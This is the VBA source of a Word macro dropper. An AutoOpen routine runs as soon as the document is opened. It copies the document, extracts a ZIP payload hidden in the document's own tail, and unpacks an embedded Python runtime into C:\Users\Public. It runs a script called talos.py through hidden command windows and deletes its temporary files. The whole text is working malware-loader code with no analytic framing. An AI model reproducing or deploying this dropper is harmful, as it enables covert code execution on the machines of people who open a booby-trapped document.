Sub main()
    Docer = ActiveDocument.FullName
    Dim User As String
    User = "C:\Users\Public"
    
    Call Shell("cmd /c copy """ + Docer + """ " + User + "\docer.doc", vbHide)
    deay (4)
    
    Dim data As String
    data = bin2var(User + "\docer.doc")
    data = Right(data, 7869792)
    var2bin User + "\smile.zip", data

    bla = VBA.FileSystem.Dir(User + "\Python38", vbDirectory)
    If bla <> VBA.Constants.vbNullString Then
        Call Shell("cmd /c rmdir /s /q " + User + "\Python38", vbHide)
        deay (2)
    End If

    Unzip User + "\smile.zip", User, "Python38"

    Kill User + "\smile.zip"
    Kill User + "\docer.doc"

    Call Shell("""" & User & "\Python38\python-3.8.2-embed-amd64\python.exe" & """ """ & User & "\Python38\talos.py")
    
End Sub
'https://stackoverflow.com/a/8377707
Function bin2var(filename As String) As String
    Dim f As Integer
    f = FreeFile()
    Open filename For Binary Access Read Lock Write As #f
        bin2var = Space(FileLen(filename))
        Get #f, , bin2var
    Close #f
End Function

Sub var2bin(filename As String, data As String)
    Dim f As Integer
    f = FreeFile()
    Open filename For Output Access Write Lock Write As #f
        Print #f, data;
    Close #f
End Sub
Sub Unzip(Fname As Variant, DefPath as String, TarFold As String)
    Dim oApp As Object
    Dim FileNameFolder As Variant
    
    If Right(DefPath,1) <> "\" Then
        DefPath = DefPath & "\"
    End If

    strDate = Format(Now, " dd-mm-yy h-mm-ss")
    FileNameFolder = DefPath & TarFold & "\"

    MkDir FileNameFolder

    Set oApp = CreateObject("Shell.Application")
    oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items, 4
End Sub
Function deay(min)
    Dim ptr
    ptr = DateAdd("s", min, Time())
    If ptr > Time() Then
        Do Until (Time() > ptr)
        Loop
    End If
End Function
Sub AutoOpen()
    main
End Sub
